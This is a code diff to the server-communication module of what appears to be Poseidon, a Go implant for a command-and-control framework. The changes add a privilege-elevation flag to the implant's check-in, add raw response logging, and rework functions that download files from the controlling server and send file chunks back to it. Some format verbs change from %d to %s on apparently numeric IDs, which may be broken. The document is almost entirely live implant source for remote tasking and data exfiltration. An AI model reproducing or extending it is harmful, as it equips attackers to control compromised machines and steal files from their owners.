@@ -17,6 +17,7 @@ import (
 	"time"
 
 	"github.com/xorrior/poseidon/pkg/utils/crypto"
+	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
 
@@ -140,6 +141,11 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 	checkin.IP = ip
 	checkin.Pid = pid
 	checkin.UUID = c.UUID
+	if functions.IsElevated() {
+		checkin.IntegrityLevel = 3
+	} else {
+		checkin.IntegrityLevel = 2
+	}
 
 	checkinMsg, _ := json.Marshal(checkin)
 	//log.Printf("Sending checkin msg: %+v\n", checkin)
@@ -165,6 +171,7 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 	err := json.Unmarshal(resp, &respMsg)
 	//log.Printf("Raw response: %s", string(resp))
 	if err != nil {
+		log.Println("message:\n", string(resp))
 		log.Printf("Error in unmarshal:\n %s", err.Error())
 	}
 
@@ -250,7 +257,7 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	}
 
 	if resp.StatusCode != 200 {
-		//log.Printf("Did not receive 200 response code: %d", resp.StatusCode)
+		//log.Printf("Did not receive 200 response code: %s", resp.StatusCode)
 		return make([]byte, 0)
 	}
 
@@ -381,10 +388,25 @@ func (c *C2Default) SendFile(task structs.Task, params string) {
 	c.SendFileChunks(task, raw)
 }
 
-//GetFile the data
-func (c *C2Default) GetFile(task structs.Task, fileid string) []byte {
+// Get a file
 
-	url := fmt.Sprintf("api/v1.3/files/%s/callbacks/%d", fileid, c.ApfellID)
+func (c *C2Default) GetFile(fileid string) []byte {
+	url := fmt.Sprintf("api/v1.3/files/%s/callbacks/%s", fileid, c.ApfellID)
+	encfileData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url))
+
+	//decFileData := c.decryptMessage(encfileData)
+	if len(encfileData) > 0 {
+		rawData, _ := base64.StdEncoding.DecodeString(string(encfileData))
+		return rawData
+	}
+
+	return make([]byte, 0)
+}
+
+//Upload the data
+func (c *C2Default) Upload(task structs.Task, fileid string) []byte {
+
+	url := fmt.Sprintf("api/v1.3/files/%s/callbacks/%s", fileid, c.ApfellID)
 	encfileData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url))
 
 	//decFileData := c.decryptMessage(encfileData)
@@ -441,7 +463,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 		tResp.Response = base64.StdEncoding.EncodeToString(encmsg)
 		dataToSend, _ := json.Marshal(tResp)
 
-		endpoint := fmt.Sprintf("api/v1.3/responses/%d", task.ID)
+		endpoint := fmt.Sprintf("api/v1.3/responses/%s", task.ID)
 		resp := c.htmlPostData(endpoint, dataToSend)
 		postResp := structs.FileChunkResponse{}
 		_ = json.Unmarshal(resp, &postResp)
